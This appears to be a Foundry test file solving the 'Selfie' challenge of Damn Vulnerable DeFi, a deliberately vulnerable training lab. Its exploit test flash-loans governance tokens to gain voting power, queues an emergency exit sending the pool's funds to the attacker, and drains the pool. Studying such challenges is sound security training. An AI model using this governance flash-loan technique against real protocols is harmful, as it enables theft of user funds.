// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Challenge} from "./utils/Challenge.sol";

import {SelfiePool} from "dvd-v3/selfie/SelfiePool.sol";
import {SimpleGovernance} from "dvd-v3/selfie/SimpleGovernance.sol";
import {ISimpleGovernance} from "dvd-v3/selfie/ISimpleGovernance.sol";

import {SelfieReceiver} from "../src/SelfieReceiver.sol";


contract Selfie is Challenge {

    SelfiePool internal sp;
    SimpleGovernance internal sg;

    uint256 constant internal TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant internal TOKENS_IN_POOL = 1_500_000e18;

    function setUp() public {
        newActors(10e18, 10e18);

        vm.startPrank(deployer);
        deployDVTS(TOKEN_INITIAL_SUPPLY);
        sg = new SimpleGovernance(address(dvts));
        assertEq(sg.getActionCounter(), 1);

        sp = new SelfiePool(address(dvts), address(sg));
        //assertEq(address(sp.token()), address(dvts));
        //assertEq(sp.governance(), address(sg));

        dvts.transfer(address(sp), TOKENS_IN_POOL);
        dvts.snapshot();
        assertEq(dvts.balanceOf(address(sp)), TOKENS_IN_POOL);
        assertEq(sp.maxFlashLoan(address(dvts)), TOKENS_IN_POOL);
        assertEq(sp.flashFee(address(dvts), 0), 0);

        vm.stopPrank();
    }

    function test_ExploitSelfie() public {
        vm.startPrank(attacker);
        // general outline
        // flashloan the pool to attacker
        // call token snapshot - makes _hasEnoughVotes => true
        // queue sp.emergencyExit(address(attacker))
        // increase time by 2 days
        // call execute action
        SelfieReceiver sr = new SelfieReceiver(sp, dvts, sg, address(attacker));
        uint256 maxLoan = sp.maxFlashLoan(address(dvts));
        sp.flashLoan(sr, address(dvts), maxLoan, "0");
        vm.warp(block.timestamp + 2 days);
        sg.executeAction(1);
        vm.stopPrank();
        validation();
    }

    function test_StorySelfie() public {

    }

    function validation() override public {
        assertEq(dvts.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvts.balanceOf(address(sp)), 0);
    }

}